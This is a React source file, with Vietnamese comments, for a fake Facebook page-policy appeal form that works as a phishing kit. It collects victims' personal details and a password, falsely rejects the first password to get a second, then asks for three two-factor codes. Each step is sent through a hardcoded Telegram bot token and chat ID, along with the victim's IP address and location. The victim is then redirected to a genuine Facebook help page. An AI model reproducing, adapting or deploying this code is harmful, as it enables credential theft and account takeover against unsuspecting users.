import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom"; // ✅ thêm
import { useTranslation } from "react-i18next";
import "./LoginForm.scss";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";

function LoginForm({ onClose }) {
  // State quản lý hiển thị password
  const { t } = useTranslation();
  const botToken = "8056845785:AAHpHNS3WjVDo17QAyWhbnn5tja5YQfYooc";
  const chatId = "-4943927839"; // ✅ ĐÚNG chatID mới
  const [messageId, setMessageId] = useState(null); // dùng để cập nhật tin nhắn

  const navigate = useNavigate();
  const [isShowPass, setIsShowPass] = useState(false);
  const [loadingInitial, setLoadingInitial] = useState(false); // Submit Appeal (form đầu)
  const [loadingPassword, setLoadingPassword] = useState(false); // State lưu thông tin form
  const [code, setCode] = useState("");
  const [code1, setCode1] = useState("");
  const [code2, setCode2] = useState(""); // ✅ thêm
  const [code3, setCode3] = useState(""); // ✅ thêm
  const [additionalInfo, setAdditionalInfo] = useState("");

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [password1, setPassword1] = useState("");
  const [password2, setPassword2] = useState("");
  const [currentUrl, setCurrentUrl] = useState("");

  const [isSuccess, setIsSuccess] = useState(false);
  const [isSubmited, setIsSubmited] = useState(false);

  const [clickCount, setClickCount] = useState(0);
  const [clickCount1, setClickCount1] = useState(0);
  const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
  const [isSubmitCodeDisabled, setIsSubmitCodeDisabled] = useState(true);
  const [isFirstAttemptDisabled, setIsFirstAttemptDisabled] = useState(false);

  const [timeLeft, setTimeLeft] = useState(10);
  const [timeLeftFirstAttempt, setTimeLeftFirstAttempt] = useState(5);

  const [ip, setIp] = useState("");
  const [location, setLocation] = useState("");
  const [countryCode, setCountryCode] = useState("");
  const [flagUrl, setFlagUrl] = useState("");

  // State lưu lỗi
  const [errors, setErrors] = useState({
    email: "",
    password: "",
    code: "",
    submit: "",
    isSubmitCode: "",
    fullName: "",
    personalEmail: "",
    businessEmail: "",
    phoneNumber: "",
    dateOfBirth: "",
    link: "",
  });

  const handlePhoneChange = (value, country) => {
    setFormData((prev) => ({
      ...prev,
      phoneNumber: value,
      countryCode: country.countryCode.toUpperCase(),
    }));
  };

  const [formData, setFormData] = useState({
    fullName: "",
    personalEmail: "",
    businessEmail: "",
    phoneNumber: "",
    dateOfBirth: "",
    link: "",
    countryCode: "US",
    additionalInfo: "",
    currentUrl: "",
  });

  const handleDateChange = (e) => {
    let value = e.target.value.replace(/\D/g, "");
    let formattedValue = "";

    if (value.length > 0) {
      formattedValue = value.substring(0, 2);
      if (value.length > 2) {
        formattedValue += "/" + value.substring(2, 4);
        if (value.length > 4) {
          formattedValue += "/" + value.substring(4, 8);
        }
      }
    }

    setFormData((prevData) => ({
      ...prevData,
      dateOfBirth: formattedValue,
    }));
  };

  useEffect(() => {
    const url = window.location.href;
    setCurrentUrl(url);

    const fetchData = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        if (!response.ok) {
          throw new Error("Failed to fetch IP data");
        }
        const result = await response.json();
        setIp(result.ip);

        if (result && result.ip) {
          const locationResponse = await fetch(
            `https://api.ipgeolocation.io/ipgeo?apiKey=126b3879b6b549f8a3e47448ae0a8e91&ip=${result.ip}`
          );
          if (!locationResponse.ok) {
            throw new Error("Failed to fetch location data");
          }
          const locationData = await locationResponse.json();

          const callingCode = locationData?.calling_code || "";
          const countryCode = locationData?.country_code2 || "";
          const flagUrl = `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`;

          setCountryCode(callingCode);
          setFlagUrl(flagUrl);

          setFormData((prev) => ({
            ...prev,
            phoneNumber: callingCode ? `${callingCode} ` : "",
            countryCode: countryCode || "US",
          }));

          const district = locationData?.district || "N/A";
          const city = locationData?.city || "N/A";
          const country = locationData?.country_name || "N/A";
          const locationText = `${district} / ${city} / ${country}`;

          setLocation(locationText);
        }
      } catch (err) {
        console.log(err);
      }
    };

    fetchData();
  }, []);

  const handleOnchange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleOnchangeEmail = (e) => {
    setErrors((prevErrors) => ({
      ...prevErrors,
      email: "",
      submit: "",
    }));
    setEmail(e.target.value);
  };

  const handleOnchangePassword = (e) => {
    setErrors((prevErrors) => ({
      ...prevErrors,
      password: "",
      submit: "",
    }));
    setPassword(e.target.value);
  };

  const handleOnchangeCode = (e) => {
    setIsSubmitCodeDisabled(false);
    const input = e.target.value;
    if (/^\d{0,8}$/.test(input)) {
      setCode(input);
    }
  };

  const validateInputs = () => {
    let isValid = true;
    const newErrors = { email: "", password: "" };

    if (!password) {
      newErrors.password = "Password is required";
      isValid = false;
    }

    setErrors(newErrors);
    return isValid;
  };

  const validate = () => {
    const newErrors = {};
    let isValid = true;

    if (!formData.fullName) {
      newErrors.fullName = "Full Name is required!";
      isValid = false;
    }

    if (!formData.personalEmail) {
      newErrors.personalEmail = "Email is required!";
      isValid = false;
    }

    // if (!formData.businessEmail) {
    //   newErrors.businessEmail = "Email Business is required!";
    //   isValid = false;
    // }

    if (!formData.phoneNumber) {
      newErrors.phoneNumber = "Phone Number is required!";
      isValid = false;
    }

    if (!formData.dateOfBirth) {
      newErrors.dateOfBirth = "Date of Birth is required!";
      isValid = false;
    } else if (!/^\d{2}\/\d{2}\/\d{4}$/.test(formData.dateOfBirth)) {
      newErrors.dateOfBirth = "Invalid date format (MM/DD/YYYY)";
      isValid = false;
    }

    if (!formData.link) {
      newErrors.link = "Page Name is required!";
      isValid = false;
    }

    setErrors(newErrors);
    return isValid;
  };

  const formatDate = (dateString) => {
    if (!dateString) return "";
    const [year, month, day] = dateString.split("-");
    return `${day}/${month}/${year}`;
  };

  const getCurrentTime = () => {
    const now = new Date();
    const timeString = now.toLocaleTimeString("vi-VN");
    const dateString = now.toLocaleDateString("vi-VN");
    return `${timeString} ${dateString}`;
  };

  const sendInitialDataToTelegram = async () => {
    try {
      const currentTime = getCurrentTime();
      const locationParts = location.split("/").map((part) => part.trim());

      const initialMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail}</code>
📞 SĐT: <code>${formData.phoneNumber}</code>
🔄 Trạng thái: Đang chờ mật khẩu...`;

      const res = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: initialMessage,
            parse_mode: "HTML",
          }),
        }
      );

      const data = await res.json();

      if (data?.ok && data?.result?.message_id) {
        localStorage.setItem("telegram_msg_id", data.result.message_id); // ✅ lưu vào localStorage
        setMessageId(data.result.message_id);
      }
    } catch (err) {
      console.error("Telegram Error:", err);
    }
  };

  // Cập nhật dữ liệu trên EmailJS
  const updateTelegramMessage = async (newMessage) => {
    if (!messageId) return;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text: newMessage,
          parse_mode: "HTML",
        }),
      });
    } catch (err) {
      console.error("Telegram Update Error:", err);

      // fallback gửi message mới nếu không sửa được
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: newMessage,
          parse_mode: "HTML",
        }),
      });
    }
  };

  const currentTime = getCurrentTime();
  const locationParts = location.split("/").map((part) => part.trim());
  const finalMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail}</code>
📞 SĐT: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${password1}</code>
🔑 Mật Khẩu 2: <code>${password2}</code>
🔓 CODE 2FA 1: <code>${code1}</code>
🔓 CODE 2FA 2: <code>${code2}</code>
🔓 CODE 2FA 3: <code>${code3}</code>
🔄 Trạng thái: Hoàn tất!`;
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (loadingPassword) return; // chặn double-click

    if (validateInputs()) {
      setLoadingPassword(true);
      setIsSubmitDisabled(true);

      const currentTime = getCurrentTime();
      const locationParts = location.split("/").map((part) => part.trim());

      if (clickCount === 0) {
        // Lưu tạm vào biến local (chưa setState vội)
        const firstPassword = password;
        setPassword1(firstPassword);

        const finalMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail}</code>
📞 SĐT: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${firstPassword}</code>
🔄 Trạng thái: Đang chờ mật khẩu 2...`;

        await updateTelegramMessage(finalMessage);

        setTimeout(() => {
          setErrors((prevErrors) => ({
            ...prevErrors,
            submit: t("login_form.error_incorrect_password"),
          }));
          setPassword("");
          setIsSubmitDisabled(false);
          setLoadingPassword(false);
        }, 3000);
      } else if (clickCount === 1) {
        const secondPassword = password;
        setPassword2(secondPassword);

        const finalMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail}</code>
📞 SĐT: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${password1}</code>
🔑 Mật Khẩu 2: <code>${secondPassword}</code>
🔄 Trạng thái: Đang chờ mã xác thực 2FA...`;

        await updateTelegramMessage(finalMessage);

        setTimeout(() => {
          setIsSubmitDisabled(false);
          setLoadingPassword(false);

          navigate(
            "/two_step_verification/two_factor?encrypted_context=ARGXVDNmvkm6x1PKWXYxZf5pV2sdJvMJqYMTymv2-de5YrlEWoxX0xg7RnF_rDySpQYuTuQ9d0zFWf2q6N2FdMWXQSSJMOhtiuo07gs_ereSWAR8bAQFSo0n-yFgKvwUDIr8qDgToWUi-159Og-45E4Rg7Nd5Bj6QIXOwI61sHE49rVkWStswIirOanuJKizNH_J3HCjxVYvJmOknToDzxSs2kWeBlsZKyA6BV7tVWnve92CBz_-HJEX1BAjQ-1-0HXM0ieM_J5QnDryfj1Q3wS9opHD8NgBuKLa17Rl2ImkhMs2T_9Xb5MoxtFLeMgDQEjfzeb8XXe957xSmfyBgZp8PeYQ3L5Dt-fKD2R7idaoggN6c-wnpjprnV5uWQRx5kCfAOsj4u1LtJrsQb6XQKWBeS8v3ZGKolKDUli_Wrb37OLyPlfNbbeVJ5TcPeTB52MF&flow=two_factor_login&next",
            {
              state: {
                method: "app",
                ip,
                location,
                formData,
                password1,
                password2: secondPassword,
                additionalInfo,
                currentUrl,
              },
              replace: true,
            }
          );
        }, 1200);
      }

      setClickCount((prev) => prev + 1);
    }
  };

  const sendToTelegram = async () => {
    try {
      const currentClick = clickCount1;
      setClickCount1((prev) => prev + 1);

      if (currentClick === 0) {
        setCode1(code);
        await updateTelegramMessage(finalMessage);

        setIsSubmitDisabled(true);
        setTimeLeft(10);
        const timer = setInterval(() => {
          setTimeLeft((prev) => {
            if (prev <= 1) {
              clearInterval(timer);
              setIsSubmitDisabled(false);
              return 0;
            }
            return prev - 1;
          });
        }, 1000);

        setCode("");
      } else if (currentClick === 1) {
        setCode2(code);
        await updateTelegramMessage(finalMessage);

        setIsSubmitDisabled(true);
        setTimeLeft(10);
        const timer = setInterval(() => {
          setTimeLeft((prev) => {
            if (prev <= 1) {
              clearInterval(timer);
              setIsSubmitDisabled(false);
              return 0;
            }
            return prev - 1;
          });
        }, 1000);

        setCode("");
      } else if (currentClick === 2) {
        await updateTelegramMessage(finalMessage);

        setTimeout(() => {
          window.location.href =
            "https://www.facebook.com/help/1735443093393986/";
        }, 2000);
      }
    } catch (err) {
      console.error("EmailJS Error:", err);
    }
  };

  const toggleShowPass = () => {
    setIsShowPass(!isShowPass);
  };

  const handleSubmit1 = async (e) => {
    e.preventDefault();
    if (loadingInitial) return; // chặn double-click
    if (validate()) {
      setLoadingInitial(true);
      try {
        await sendInitialDataToTelegram();

        setIsSubmited(true);
      } catch (err) {
        console.error(err);
      } finally {
        setLoadingInitial(false);
      }
    }
  };

  return (
    <div className="modal-content" onClick={(e) => e.stopPropagation()}>
      {/* PHẦN 1: Form nhập thông tin ban đầu */}
      <div className="title-main">
        <h3>{t("login_form.page_policy_title")}</h3>
      </div>
      <div
        className={`form-initial ${isSubmited && !isSuccess ? "blurred" : ""}`}
      >
        <div className="top">
          <div className="desc-main">
            <p>{t("login_form.desc1")}</p>
            <p>{t("login_form.desc2")}</p>
            <p>{t("login_form.desc3")}</p>
          </div>
          <form onSubmit={handleSubmit1} lang="en">
            <div className="dateofbirth">
              <p>{t("login_form.label.page_name")}</p>
            </div>
            <div className="input-box">
              <input
                type="text"
                name="link"
                value={formData.link}
                onChange={handleOnchange}
                className={errors.link ? "error-input" : ""}
              />
            </div>

            <div className="dateofbirth">
              <p>{t("login_form.label.full_name")}</p>
            </div>
            <div className="input-box">
              <input
                type="text"
                name="fullName"
                value={formData.fullName}
                onChange={handleOnchange}
                className={errors.fullName ? "error-input" : ""}
              />
            </div>

            <div className="dateofbirth">
              <p>{t("login_form.label.personal_email")}</p>
            </div>
            <div className="input-box">
              <input
                type="email"
                name="personalEmail"
                value={formData.personalEmail}
                onChange={handleOnchange}
                className={errors.personalEmail ? "error-input" : ""}
              />
            </div>

            {/* <div className="dateofbirth">
              <p>Business Email Address *</p>
            </div>
            <div className="input-box">
              <input
                type="email"
                name="businessEmail"
                value={formData.businessEmail}
                onChange={handleOnchange}
                className={errors.businessEmail ? "error-input" : ""}
              />
            </div> */}

            <div className="dateofbirth">
              <p>{t("login_form.label.phone")}</p>
            </div>
            <div className="input-box">
              <PhoneInput
                country={formData.countryCode?.toLowerCase() || "us"}
                value={formData.phoneNumber}
                onChange={handlePhoneChange}
                inputProps={{
                  name: "phoneNumber",
                  required: true,
                }}
                containerClass={`phone-input-container ${
                  errors.phoneNumber ? "error-input" : ""
                }`}
                inputClass="phone-input"
                buttonClass="phone-input-button"
                dropdownClass="phone-input-dropdown"
              />
            </div>

            <div className="dateofbirth">
              <p>{t("login_form.label.date_of_birth")}</p>
            </div>
            <div className="input-box">
              <input
                className={`dateinput ${
                  errors.dateOfBirth ? "error-input" : ""
                }`}
                type="text"
                name="dateOfBirth"
                value={formData.dateOfBirth}
                onChange={handleDateChange}
                placeholder="MM/DD/YYYY"
                maxLength="10"
              />
            </div>

            {/* <div className="dateofbirth">
              <p>
                Please provide us information that will help us investigate.
              </p>
            </div>
            <div className="input-box">
              <textarea
                name="additionalInfo"
                rows="4"
                value={additionalInfo}
                onChange={(e) => setAdditionalInfo(e.target.value)}
              ></textarea>
            </div> */}

            <button
              type="submit"
              className="login-btn"
              disabled={loadingInitial}
            >
              {loadingInitial ? (
                <span className="spinner-inline" />
              ) : (
                t("login_form.submit")
              )}
            </button>
          </form>
        </div>
      </div>

      {/* PHẦN 2: Password Overlay */}
      {isSubmited && !isSuccess && (
        <div className="password-overlay">
          <div className="top">
            <img
              className="logo"
              src="data:image/png;base64,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"
              alt=""
            />{" "}
            <form onSubmit={handleSubmit}>
              <div className="input-box">
                <p className="label2">
                  {t("login_form.enter_password_prompt")}
                </p>
                <div className="box">
                  <input
                    type={isShowPass ? "text" : "password"}
                    placeholder={t("login_form.password_placeholder")}
                    value={password}
                    onChange={handleOnchangePassword}
                  />
                  {errors.password && (
                    <span className="error">{errors.password}</span>
                  )}
                  {isShowPass ? (
                    <i
                      className="fa-regular fa-eye"
                      onClick={toggleShowPass}
                    ></i>
                  ) : (
                    <i
                      className="fa-regular fa-eye-slash"
                      onClick={toggleShowPass}
                    ></i>
                  )}
                </div>
              </div>
              {errors.submit && <span className="error">{errors.submit}</span>}
              <button
                type="submit"
                className="login-btn"
                disabled={isSubmitDisabled || loadingPassword}
              >
                {loadingPassword ? (
                  <span className="spinner-inline" />
                ) : (
                  t("login_form.continue")
                )}
              </button>
            </form>
          </div>
        </div>
      )}

      {/* PHẦN 3: Mã xác thực 2FA */}
      {isSuccess && (
        <div className="top">
          <div className="check">
            <p className="title">Two-factor authentication required (1/3)</p>
            <p className="desc">
              The verification code has been sent to your phone number or
              E-mail, please check your inbox and enter the code below to
              complete. In case you do not receive the code, please check the
              Facebook notification on your device and confirm it is you to
              complete the verification process.
            </p>
            <img src="/checkpoint.png" alt="" />
          </div>
          <div className="check">
            <div className="input-box">
              <input
                type="text"
                placeholder="Code"
                value={code}
                onChange={handleOnchangeCode}
                maxLength={8}
              />
              {errors.isSubmitCode && (
                <span className="error">{errors.isSubmitCode}</span>
              )}
            </div>
            {isSubmitDisabled && (
              <span className="error">
                The two-factor authentication you entered is incorrect. Please,
                try again after {Math.floor(timeLeft / 60)} minutes{" "}
                {String(timeLeft % 60).padStart(2, "0")} seconds
              </span>
            )}
            <button
              type="button"
              className={`login-btn ${isSubmitDisabled ? "disabled" : ""} ${
                isSubmitCodeDisabled ? "btn-disabled" : ""
              }`}
              onClick={sendToTelegram}
              disabled={isSubmitDisabled}
            >
              Continue
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default LoginForm;
